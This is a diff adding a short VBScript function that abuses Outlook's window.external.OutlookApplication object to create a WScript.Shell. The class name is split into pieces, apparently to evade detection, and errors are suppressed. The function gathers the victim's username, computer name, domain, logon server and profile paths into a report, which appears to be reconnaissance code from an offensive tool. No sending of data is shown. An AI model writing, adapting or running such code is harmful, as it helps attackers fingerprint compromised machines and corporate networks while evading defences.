@@ -1,0 +1,18 @@
+Function list_basic()
+	On error resume next
+	Set sh = window.external.OutlookApplication.CreateObject("Wsc" & "ript.Sh" & "ell")
+	
+	gds = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
+	huj = sh.ExpandEnvironmentStrings("%USERNAME%")
+	imd = sh.ExpandEnvironmentStrings("%USERDOMAIN%")
+	fvy = sh.ExpandEnvironmentStrings("%USERPROFILE%")
+	udd = sh.ExpandEnvironmentStrings("%USERDNSDOMAIN%")
+	fah = sh.ExpandEnvironmentStrings("%LOGONSERVER%")
+	hyf = sh.ExpandEnvironmentStrings("%HOMEPATH%")
+	
+	If udd = "%USERDNSDOMAIN%" Then
+		udd = "WORKGROUP"
+	End If
+	
+	list_basic = "UserName: " & huj & vbCrLf & "ComputerName: " & gds & vbCrLf & "UserDomain: " & imd & vbCrLF & "UserDNSDomain: " & udd & vbCrLF & "Logon server: " & fah & vbCrLF & "Homepath: " & hyf & vbCrLF & "UserProfile: " & fvy & vbCrLF & vbCrLf
+End Function
